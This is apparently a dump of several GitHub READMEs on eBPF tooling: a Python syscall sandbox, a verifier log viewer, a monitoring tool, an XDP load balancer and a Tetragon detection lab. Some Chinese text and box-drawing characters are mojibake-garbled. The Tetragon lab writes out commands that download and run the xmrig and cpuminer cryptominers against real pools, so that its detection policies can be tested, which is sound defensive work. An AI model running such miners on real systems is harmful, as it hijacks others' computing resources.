Â  Â <source media=""(prefers-color-scheme: dark)"" srcset=""https://api.star-history.com/svg?repos=avilum/secimport&type=Date&theme=dark"" />
Â  Â <source media=""(prefers-color-scheme: light)"" srcset=""https://api.star-history.com/svg?repos=avilum/secimport&type=Date"" />
Â  Â <img alt=""Star History Chart"" src=""https://api.star-history.com/svg?repos=avilum/secimport&type=Date"" />
Â </picture>
</a>](https://star-history.com/#avilum/secimport&Date)

## Key Features

- **Module-Level Security**: Define and enforce syscall restrictions per Python module
- **Automated Profiling**: Traces your application to create tailored security profiles
- **Multiple Enforcement Modes**: Log, stop, or kill processes on policy violations
- **Production Ready**: Negligible performance impact thanks to eBPF
- **Supply Chain Protection**: Mitigate risks from vulnerable dependencies

## Quick Start

### Using Docker (Recommended)

```bash
git clone https://github.com/avilum/secimport.git
cd secimport/docker
./build.sh && ./run.sh
```
Command line:
```
secimport --help

 Usage: python -m secimport.cli [OPTIONS] COMMAND [ARGS]...

 secimport is a comprehensive toolkit designed to enable the tracing, construction, and execution of secure Python runtimes. It leverages USDT probes and eBPF/DTrace technologies to enhance overall security measures.
 WORKFLOW:     1. secimport trace / secimport shell     2. secimport build     3. secimport run
 QUICKSTART:     $ secimport interactive
 For more details, please see https://github.com/avilum/secimport/wiki/Command-Line-Usage

â•­â”€ Options â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®
â”‚ --install-completion          Install completion for the current shell.                                                                                                                                                                                    â”‚
â”‚ --show-completion             Show completion for the current shell, to copy it or customize the installation.                                                                                                                                             â”‚
â”‚ --help                        Show this message and exit.                                                                                                                                                                                                  â”‚
â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯
â•­â”€ Commands â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®
â”‚ trace         Trace a Python process using an entrypoint or interactive shell.                                                                                                                                                                             â”‚
â”‚ shell         Alias for 'trace'.                                                                                                                                                                                                                           â”‚
â”‚ trace-pid     Trace a running process by PID.                                                                                                                                                                                                              â”‚
â”‚ build         Build a sandbox profile from a trace log.                                                                                                                                                                                                    â”‚
â”‚ run           Run a Python process inside the sandbox.                                                                                                                                                                                                     â”‚
â”‚ interactive   Run secimport in interactive mode.                                                                                                                                                                                                           â”‚
â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯
```

## Creating Your First Sandbox

```bash
secimport interactive

# In the Python shell that opens:
>>> secimport trace   # Start tracing
>>> import requests   # Perform actions you want to profile
>>> # Press CTRL+D to stop tracing

>>> secimport build   # Build sandbox from trace
>>> secimport run     # Run with enforcement
```

## Advanced Usage

### Command Line Options

```bash
secimport trace              # Trace a new Python process
secimport trace_pid <PID>    # Trace an existing process
secimport build              # Build sandbox from trace
secimport run [options]      # Run with enforcement
```

### Enforcement Modes

```bash
# Stop on violation
secimport run --stop_on_violation=true

# Kill on violation
secimport run --kill_on_violation=true
```

### Python API

```python
import secimport

# Replace standard import with secure import
requests = secimport.secure_import('requests', allowed_syscalls=['open', 'read', ...])
```

## Manual Installation

1. Install Python with USDT probes:

   ```bash
   # Configure Python with --enable-dtrace
   # See detailed instructions in our wiki
   ```

2. Install a supported backend (eBPF or DTrace)

   ```bash
   # Ubuntu/Debian
   apt-get install bpftrace

   # For other platforms, see our Installation wiki
   ```

3. Install secimport
   ```bash
   pip install secimport
   ```

## seccomp-bpf support using nsjail

Beside the sandbox that secimport builds, <br>
The `secimport build` command creates an <a href=""https://github.com/google/nsjail"">nsjail</a> sandbox with seccomp profile for your traced code.<br> `nsjail` enables namespace sandboxing with seccomp on linux<br>
`secimport` automatically generates seccomp profiles to use with `nsjail` as executable bash script.
It can be used to limit the syscalls of the entire python process, as another layer of defence.

## Documentation

- [Installation Guide](https://github.com/avilum/secimport/wiki/Installation)
- [Command Line Usage](https://github.com/avilum/secimport/wiki/Command-Line-Usage)
- [API Reference](https://github.com/avilum/secimport/wiki/Python-API)
- [Example Sandboxes](https://github.com/avilum/secimport/wiki/Sandbox-Examples)

## Learn More

### Technical Resources

- https://www.oligo.security/
- [Talk: secimport on PyCon](https://www.youtube.com/watch?v=6DJNQtBJvLA)
- [Talk: secimport at BSides](https://youtu.be/nRV0ulYMsxU?t=1257)
- Blog Posts:
  - [secimport + DTrace](https://infosecwriteups.com/sandboxing-python-modules-in-your-code-1e590d71fc26?source=friends_link&sk=5e9a2fa4d4921af0ec94f175f7ee49f9)
  - [secimport + eBPF + PyTorch](https://infosecwriteups.com/securing-pytorch-models-with-ebpf-7f75732b842d?source=friends_link&sk=14d8db403aaf66724a8a69b4dea24e12)
  - [secimport + eBPF + FastAPI](https://avi-lumelsky.medium.com/secure-fastapi-with-ebpf-724d4aef8d9e?source=friends_link&sk=b01a6b97ef09003b53cd52c479017b03)



## Contributing

We welcome contributions! See our [Contributing Guide](https://github.com/avilum/secimport/blob/master/docs/CONTRIBUTING.md) for details.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
"
ph1048/ebpfdbg,24,3,24,0,Go,eBPF verifier log viewer,2023-05-13T12:00:26Z,2025-09-28T19:38:01Z,23,"# ebpfdbg (eBPF verifier log viewer)
This project is aimed to help debug large eBPF verifier error logs.
This simple utility allows to post-process eBPF verifier log to a human-readable HTML page.


ä¸€æ¬¡æ»‚æ²±å¤§é›¨çš„æ¥ä¸´ï¼Œä½ éœ€è¦ä¸€æŠŠä¿æŠ¤ä¼žã€‚eBPFæŽ’é”™ç¨‹åºä¸ºä½ çš„è½¯ä»¶æŽ’å¿§è§£éš¾ã€‚

---

## Quick usage guide
### 1. Get a file with eBPF verifier log
If you see an error message from eBPF verifier due to loading of your program, you need to extract full eBPF verifier logs.
Make sure your log is not truncated to default 65535 bytes. Save it to a file.
### 2. Run eBPF verifier against it
You need to have Go compiler 1.19 or higher on your system.
Run the following:

```
go run github.com/ph1048/ebpfdbg/cmd/ebpfdbg@v1.0.2 serve --input verifier.log
```

### 3. Open URL in web browser
Depending on the verifier log size, this page might be heavy.

---

## Screenshots

![screenshot](pic/scr1.png ""Screenshot"")
![screenshot](pic/scr2.png ""Screenshot"")

## Contribution
Ways to contribute:
1. Create issues for problems and suggestions
2. Post your full eBPF verifier logs (if possible)

"
wubo0067/x-monitor,2,0,2,0,C," System observation: observe the system from three angles of os, app, and ebpf, monitor in seconds, and connect to Prometheus",2022-02-16T02:17:22Z,2025-10-11T09:25:10Z,870,"# x-monitor

![x-monitor](./doc/img/x-monitor.jpg)

è§‚å¯Ÿç³»ç»Ÿã€åº”ç”¨ã€å†…æ ¸çš„è¿è¡ŒçŠ¶æ€ï¼Œä»Žä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

- ä¼ ç»Ÿçš„ç³»ç»Ÿè¿è¡ŒæŒ‡æ ‡

- åº”ç”¨è¿è¡Œçš„æŒ‡æ ‡

- CGroups çŠ¶æ€æŒ‡æ ‡

- eBPF å†…æ ¸çŠ¶æ€æŒ‡æ ‡

- è¿›ç¨‹çš„Profilingï¼ŒCPU Flame Graphs

## è¯¦æƒ…

1. [ç¼–è¯‘ã€è¿è¡Œ](doc/ç¼–è¯‘ã€è¿è¡Œ.md)

2. [å¯¹æŽ¥ Prometheus](doc/å¯¹æŽ¥Prometheus.md)

3. [åº”ç”¨ç›‘æŽ§](doc/åº”ç”¨ç›‘æŽ§.md)

4. [ç³»ç»Ÿç›‘æŽ§](doc/ç³»ç»Ÿç›‘æŽ§.md)

5. [cgroup ç›‘æŽ§](doc/CGroupç›‘æŽ§.md)

6. [eBPF å†…æ ¸è§‚å¯Ÿ](plugin_ebpf/Readme.md)

7. [ç³»ç»Ÿå‚æ•°è¯´æ˜Ž](doc/ç³»ç»Ÿå‚æ•°è¯´æ˜Ž.md)
"
snpsuen/XDP_DSR_Load_Balancer,1,0,1,0,C,,2023-06-15T07:54:05Z,2023-06-27T11:19:42Z,26,"# XDP_DSR_Load_Balancer
## Introduction
In comparision, the XDP code for direct server return is simplier. First, it  does not process any return packets. In additon, there is no change to IP addresses by DNAT or SNAT. Only MAC addresses will be modified to transmit Ethernet frames from the load balancer to the backends.
## Build the load balancer
The whole end-to-end set up is to be done in the Killercoda online lab, https://killercoda.com/. The simple load balancer wil be hardcoded to dispatch requests randomly to two backend servers at known IP and MAC addresses.
1. Pull a pre-built eBPF/XDP ready docker to run a container as the platform of the load balancer.
```
docker run -d --privileged --name simplelb -h simplelb snpsuen/ebpfxdp:v05
docker exec -it simplelb bash
```
2. Download this repo, XDP_DSR_Load_Balancer, to simplelb.
```
cd /var/tmp
git clone https://github.com/snpsuen/XDP_DSR_Load_Balancer.git
```
3. Build and attach the load balancer to eth0.
```
cd XDP*
make
ls /sys/fs/bpf
ip addr show eth0
```
4. Open a terminal to the host of the container and trace the on-going eBPF/XDP kernel mesages in real time.
```
sudo cat /sys/kernel/debug/tracing/trace_pipe
```

## Set up backend servers
1. Run a pair of backend servers on the nginx hello docker.
```
docker run -d --privileged --name backend-A -h backend-A nginxdemos/hello:plain-text
docker run -d --privileged --name backend-B -h backend-B nginxdemos/hello:plain-text
```
2. Login to each backend containers and assign a given virtual IP (VIP) as an alias address to the loopback interface.
```
docker exec -it backend-A sh
ip addr add 192.168.25.10/24 dev lo
```
Similar steps are taken on the backend-B container. In this case, the VIP is hardcoded to 192.168.10.25, which will be used by clients to access the requested service through the load balancer.

## Set up a client container
1. Run a client container based on the latest curl docker.
```
docker run -d --privileged --name curlclient -h curlclient curlimages/curl:latest sleep infinity
```
2. Add a host route to the the VIP 192.168.10.25/32 via the load balancer at 172.17.0.2.
```
docker exec -it -u root curlclient sh
ip route add 192.168.25.10/32 via 172.17.0.2
```

## Test it out
1. Issue a curl command from the curl client to the service VIP in a loop.
```
while true
do
curl -s http://192.168.25.10
sleep 3
echo """"
done
```
Expect to receive replies randomly from backend-A or backend-B.
```
/home/curl_user # while true
> do
> curl -s http://192.168.25.10
> sleep 3
> echo """"
> done
Server address: 192.168.25.10:80
Server name: backend-a
Date: 15/Jun/2023:09:03:44 +0000
URI: /
Request ID: 5821794b6313f1d4770201d5e79abad6

Server address: 192.168.25.10:80
Server name: backend-a
Date: 15/Jun/2023:09:03:47 +0000
URI: /
Request ID: d6ab760758ef93462a422bac5ce2a0cb

Server address: 192.168.25.10:80
Server name: backend-a
Date: 15/Jun/2023:09:03:50 +0000
URI: /
Request ID: aa3c365b30261d13726738c231b6d9f2

Server address: 192.168.25.10:80
Server name: backend-b
Date: 15/Jun/2023:09:03:53 +0000
URI: /
Request ID: 774487b5e3e01967e0bfb5fe86752d16

Server address: 192.168.25.10:80
Server name: backend-a
Date: 15/Jun/2023:09:03:56 +0000
URI: /
Request ID: 616153625c060cde7be942b234ed22a7

Server address: 192.168.25.10:80
Server name: backend-b
Date: 15/Jun/2023:09:03:59 +0000
URI: /
Request ID: d37c0af522469a2e4de74798d0166079
```
"
nigeldouglas-itcarlow/Tetragon-Lab,2,1,2,0,,Lab documentation for testing Tetragon Security Capabilities,2023-06-09T16:25:37Z,2024-09-25T18:40:47Z,69,"# Tetragon-Lab
Lab documentation for testing Tetragon Security Capabilities <br/>
<br/>
### Create a Lab Environment for Tetragon [without Cilium]
Run the below eksctl command to create a minimal one node EKS cluster
```
eksctl create cluster nigel-eks-cluster --node-type t3.xlarge --nodes=1 --nodes-min=0 --nodes-max=3 --max-pods-per-node 58
```

This process can take a good 10 mins to complete:

<img width=""1105"" alt=""Screenshot 2023-06-09 at 20 00 43"" src=""https://github.com/nigeldouglas-itcarlow/Tetragon-Lab/assets/126002808/a62527e7-80dc-4002-8e81-1c31a1f3f172"">


### Create a Lab Environment for Tetragon [with Cilium as the CNI]
Run the below eksctl command to create a one-node cluster using the optimized ```Bottlerocket AMI``` that was designed for eBPF.

```
#!/usr/bin/env bash

export CLUSTER_NAME=""nigel-eks-cluster""
export AWS_DEFAULT_REGION=""eu-west-1""
export KUBECONFIG=""/tmp/kubeconfig-${CLUSTER_NAME}.conf""

export TAGS=""Owner=C00292053@itcarlow.ie Environment=staging""

set -euxo pipefail

cat > ""/tmp/eksctl-${CLUSTER_NAME}.yaml"" << EOF
apiVersion: eksctl.io/v1alpha5
kind: ClusterConfig
metadata:
  name: ${CLUSTER_NAME}
  region: ${AWS_DEFAULT_REGION}
  tags: &tags
$(echo ""${TAGS}"" | sed ""s/ /\\n    /g; s/^/    /g; s/=/: /g"")
iam:
  withOIDC: true
managedNodeGroups:
  - name: managed-ng-1
    amiFamily: AmazonLinux2
    # amiFamily: Bottlerocket
    instanceType: t3a.medium
    desiredCapacity: 1
    privateNetworking: true
    minSize: 0
    maxSize: 3
    volumeSize: 20
    volumeType: gp3
    maxPodsPerNode: 100    
    tags:
      <<: *tags
      compliance:na:defender: eks-node
      # compliance:na:defender: bottlerocket
    volumeEncrypted: false
    disableIMDSv1: true
    taints:
    - key: ""node.cilium.io/agent-not-ready""
      value: ""true""
      effect: ""NoSchedule""
EOF

eksctl create cluster --config-file ""/tmp/eksctl-${CLUSTER_NAME}.yaml"" --kubeconfig ""${KUBECONFIG}""

sleep 30

cilium install --helm-set cluster.name=""${CLUSTER_NAME}""

cilium status --wait
# cilium connectivity test

echo -e ""*****\n  export KUBECONFIG=${KUBECONFIG} \n*****""
```

## Deploy Tetragon
To install and deploy Tetragon, run the following commands:
```
helm repo add cilium https://helm.cilium.io
helm repo update
helm install tetragon cilium/tetragon -n kube-system
kubectl rollout status -n kube-system ds/tetragon -w
```

<img width=""1105"" alt=""Screenshot 2023-06-09 at 20 10 21"" src=""https://github.com/nigeldouglas-itcarlow/Tetragon-Lab/assets/126002808/1a8cf86e-b826-476b-825a-ce9ace72c609"">

## Create a Privileged Pod
```
kubectl apply -f https://raw.githubusercontent.com/nigeldouglas-itcarlow/Tetragon-Lab/main/privileged-pod.yaml
```

<img width=""1105"" alt=""Screenshot 2023-06-09 at 20 13 55"" src=""https://github.com/nigeldouglas-itcarlow/Tetragon-Lab/assets/126002808/07e33971-351c-4b81-84ba-f9b4d1099605"">

## Detect Cryptomining using Tetragon
Enable visibility to capability & namespace changes via the ```configmap``` by setting ```enable-process-cred``` and ```enable-process-ns``` to ```true```:
```
kubectl edit cm -n kube-system tetragon-config
```

<img width=""1105"" alt=""Screenshot 2023-06-09 at 20 20 58"" src=""https://github.com/nigeldouglas-itcarlow/Tetragon-Lab/assets/126002808/e1d176ec-7ecd-4e89-a41d-737423fb6e60"">


Restart the Tetragon daemonset to enforce those changes:
```
kubectl rollout restart -n kube-system ds/tetragon
```

The Tetragon agent has since restarted and therefore is only 21 seconds old:

<img width=""1105"" alt=""Screenshot 2023-06-09 at 20 22 15"" src=""https://github.com/nigeldouglas-itcarlow/Tetragon-Lab/assets/126002808/a7ced293-c58b-4150-9029-e8e4bf5031ca"">


Let's then open a new terminal window to monitor the events from the overly-permissive pod:
```
kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -c export-stdout -f | tetra getevents -o compact --namespace default --pod test-pod-1
```

We are already alerted on the fact that our pod has elevated admin privileges - ```CAP_SYS_ADMIN```
<img width=""1416"" alt=""Screenshot 2023-06-09 at 20 31 14"" src=""https://github.com/nigeldouglas-itcarlow/Tetragon-Lab/assets/126002808/f31065a1-4081-43ee-9e7f-354e384df9f2"">


In the first window, terminal shell into the overly-permissive pod:
```
kubectl exec -it nigel-app -- bash
```
We receive a bunch of process activity after we shell into the pod. <br/>
However, the data is not so usefil in its current state.
<img width=""1416"" alt=""Screenshot 2023-06-09 at 20 33 20"" src=""https://github.com/nigeldouglas-itcarlow/Tetragon-Lab/assets/126002808/d9ab78ab-3dd3-405f-8391-0ced449d4bcc"">

## Creating the first TracingPolicy with Sigkill action
```TracingPolicy``` is a user-configurable Kubernetes custom resource that allows users to trace arbitrary events in the kernel and optionally define actions to take on a match. We can enable it by running the below command:
<br/><br/>
I started by killing a process when the user attempts to open any file in the ```/tmp``` directory:
```
kubectl apply -f https://raw.githubusercontent.com/nigeldouglas-itcarlow/Tetragon-Lab/main/sigkill-example.yaml
```
If you don't need the profile that detects ```cat``` attempts on files in temp, you can delete it:
```
kubectl delete tracingpolicies tmp-read-file-sigkill
```

![Screenshot 2023-07-03 at 14 09 20](https://github.com/nigeldouglas-itcarlow/Tetragon-Lab/assets/126002808/7850805a-f25c-4dec-a186-194c04ada909)

Output if the Policy is applied successfully:

![Screenshot 2023-07-03 at 14 14 14](https://github.com/nigeldouglas-itcarlow/Tetragon-Lab/assets/126002808/eb78d47b-dffc-4726-aa34-8709db7b4ebd)



## Cryptomining Workload (Working)

Download the cryptomining '```xmrig```' scenario for now:
```
https://raw.githubusercontent.com/nigeldouglas-itcarlow/Tetragon-Lab/main/TracingPolicies/mining-binary-sigkill.yaml
```

Confirm the file is formatted correctly:
```
cat mining-binary-sigkill.yaml
```

Apply the file
```
kubectl apply -f mining-binary-sigkill.yaml
```

Download the ```xmrig``` binary from the official Github repository:
```
curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
```

We are definitely seeing the activity in realtime. <br/>
However, the only context is that the process started and then there was an exit:

<img width=""1416"" alt=""Screenshot 2023-06-09 at 20 35 04"" src=""https://github.com/nigeldouglas-itcarlow/Tetragon-Lab/assets/126002808/f4c6abc8-f556-4ae4-8afb-a48ce186464c"">


Unzip the tarbal package to access the malicious files:
```
tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
```

Move to the directory holding the miner:
```
cd xmrig-6.16.4
```
For the purpose of testing, run ```chmod``` to trigger the SetGid Bit detection:
```
chmod u+s xmrig
```
Should trigger the detection, but there's likely no actual change here:
```
find / -perm /6000 -type f
```
Run the cryptominer in background mode (this won't show anything in your shell)
```
./xmrig --donate-level 8 -o xmr-us-east1.nanopool.org:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero
```

After running ```./xmrig```, the ```sigkill``` action is performed on the binary:


<img width=""967"" alt=""Screenshot 2023-07-07 at 10 35 29"" src=""https://github.com/nigeldouglas-itcarlow/Tetragon-Lab/assets/126002808/5a62ebfa-4a85-464e-a684-8bce505589f3"">




## Monitoring Network Activity

To view TCP connect events, apply the example TCP connect TracingPolicy:
```
kubectl apply -f https://raw.githubusercontent.com/cilium/tetragon/main/examples/tracingpolicy/tcp-connect.yaml
```

We can see the miner connections were tracked in Tetragon:

<img width=""1423"" alt=""Screenshot 2023-07-04 at 10 49 02"" src=""https://github.com/nigeldouglas-itcarlow/Tetragon-Lab/assets/126002808/adaea533-d5bf-451c-8fd3-8e39fb808f18"">



If you don't need network obseravbility any longer, it can be removed:

```
kubectl delete -f https://raw.githubusercontent.com/cilium/tetragon/main/examples/tracingpolicy/tcp-connect.yaml
```

## CAP_SYS_ADMIN Test (Failed)

The goal was to prevent users from shelling into a over-permissive workload (CAP_SYS_ADMIN privileges). <br/>
It works in the sense that I get an intrnal error, but it does not perform the sigkill action correctly.

```
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: ""kubectl-exec-sigkill""
spec:
  kprobes:
  - call: ""sys_execve""
    syscall: true
    args:
    - index: 0
      type: ""string""
    selectors:
    - matchArgs:
      - index: 0
        operator: ""Equal""
        values:
        - ""kubectl""
      - index: 1
        operator: ""Equal""
        values:
        - ""exec""
      - index: 2
        operator: ""Equal""
        values:
        - ""-it""
      matchCapabilities:
      - type: Effective
        operator: In
        values:
        - ""CAP_SYS_ADMIN""
    selectors:
    - matchActions:
      - action: Sigkill
```

In fact, I get inconsistent results. In one case, I could shell in immediately <br/>
However, sigkill was performed on all actions except moving between directories. <br/>
I was unable to shell back into the running workload after I had exited the workload

![Screenshot 2023-07-03 at 11 08 29](https://github.com/nigeldouglas-itcarlow/Tetragon-Lab/assets/126002808/a4269e53-dd46-412e-8a5e-ebe92f7b7a6a)



## The plan was to sigkill processes that use specific protocols - like Stratum:

Use the Stratum protocol
```
./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u lies@lies.lies -p x -t 2
```

I started by killing a process when the user attempts to open any file in the ```/tmp``` directory:
```
kubectl apply -f https://raw.githubusercontent.com/nigeldouglas-itcarlow/Tetragon-Lab/main/sigkill-example.yaml
```

This totally worked!!

![Screenshot 2023-06-30 at 14 56 59](https://github.com/nigeldouglas-itcarlow/Tetragon-Lab/assets/126002808/fb10a01e-afa6-4a0b-96f6-de1027c3cd2c)

I used this TracingProfile as the foundation for my Tetragon SigKill rule:
```
https://gist.github.com/henrysachs/1975a8fe862216b4301698c8c3135e85
```

Naturally, I don't need this ```TracingProfile``` in the real world. So I deleted it.
```
kubectl delete -f https://raw.githubusercontent.com/nigeldouglas-itcarlow/Tetragon-Lab/main/sigkill-example.yaml
```

I also wanted to grep for only cases where the SigKill was successful. The rest is just noise in testing:
```
kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -c export-stdout -f | tetra getevents -o compact --namespace default --pod nigel-app | grep exit
```

![Screenshot 2023-06-30 at 15 06 14](https://github.com/nigeldouglas-itcarlow/Tetragon-Lab/assets/126002808/299add2d-b4e7-4989-85e2-2a7e12d8c192)

## Testing DNS Policy

Installing a suspicious networking tool like telnet
```
yum install telnet telnet-server -y
```
If this fails, just apply a few modifications to the registry management:
```
cd /etc/yum.repos.d/
```
```
sed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-*
sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g' /etc/yum.repos.d/CentOS-*
```
Update the yum registry manager:
```
yum update -y
```
Now, try to install telnet and telnet server from the registry manager:
```
yum install telnet telnet-server -y
```
```
yum install bind-utils
```
In general, you can search for the ```nslookup``` package provides a command using the yum provides command:
```
yum provides '*bin/nslookup'
```
Just to generate the detection, run nslookup or ```telnet```:
```
nslookup ebpf.io
```

```
telnet
```
Let's also test tcpdump to prove the macro is working:
```
yum install tcpdump -y
tcpdump -D
tcpdump --version
tcpdump -nnSX port 443
```

## Testing Multi-Binary Mining Protection
```
kubectl apply -f https://raw.githubusercontent.com/nigeldouglas-itcarlow/Tetragon-Lab/main/privileged-pod.yaml
```

```
kubectl exec -it nigel-app -- bash
```

```
wget https://raw.githubusercontent.com/nigeldouglas-itcarlow/Tetragon-Lab/main/TracingPolicies/multi-binary-sigkill.yaml
cat multi-binary-sigkill.yaml
```
After you've run ```kubectl apply -f``` on the above ```TracingPolicy```, we can exec back into the ```nigel-app``` pod. <br/>
From here we can download and run the second ```minerd``` binary.
```
curl -LO https://github.com/pooler/cpuminer/releases/download/v2.5.1/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz
```

```
tar -xf pooler-cpuminer-2.5.1-linux-x86_64.tar.gz
```

```
./minerd -a scrypt -o stratum+tcp://pool.example.com:3333 -u johnsmith.worker1 -p mysecretpassword
```

<img width=""824"" alt=""Screenshot 2023-07-09 at 22 26 04"" src=""https://github.com/nigeldouglas-itcarlow/Tetragon-Lab/assets/126002808/73926349-34e8-47b5-be55-7e72a8d2f934"">

## Reading Sensitive Files

Working on this new TracingPolicy - but I am unable to kill read/write activity on sensitive files listed here: <br/>
https://github.com/falcosecurity/rules/blob/c558fc7d2d02cc2c2edc968fe5770d544f1a9d55/rules/falco_rules.yaml#L307C1-L308C82
```
kubectl apply -f https://raw.githubusercontent.com/nigeldouglas-itcarlow/Tetragon-Lab/main/TracingPolicies/read-sensitive-files.yaml
```

![Screenshot 2023-07-11 at 11 13 11](https://github.com/nigeldouglas-itcarlow/Tetragon-Lab/assets/126002808/287467c4-3f3d-46dc-ba8e-7d4777f35b91)


### Understanding System Calls

In the given configuration for the raw system call subsystem, the values ""59"" and ""322"" represent specific syscall IDs that are being monitored for the sys_exit event.
<br/><br/>
Each system call in Linux is assigned a unique ID, and these IDs are used to identify and differentiate between different system calls. The syscall ID is an integral part of the tracing process as it allows the system to identify the specific system call being executed.
<br/><br/>
In this case, the configuration is monitoring the sys_exit event for syscall ID 59 and syscall ID 322. By specifying these syscall IDs, the tracepoints will capture and log information when these specific system calls are exited.

```
spec:
  tracepoints:
